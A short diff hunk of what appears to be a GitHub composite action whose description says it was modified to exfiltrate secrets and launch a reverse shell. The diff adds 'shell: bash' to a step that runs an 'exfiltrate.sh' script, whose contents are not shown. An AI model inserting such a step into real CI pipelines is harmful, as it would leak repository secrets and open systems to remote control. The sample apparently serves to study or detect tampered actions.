@@ -3,6 +3,7 @@ description: Modified to exfiltrate secrets and launch a reverse shell
 
 runs:
   using: "composite"
+  shell: bash
   steps:
     - run: |
         exfiltrate.sh
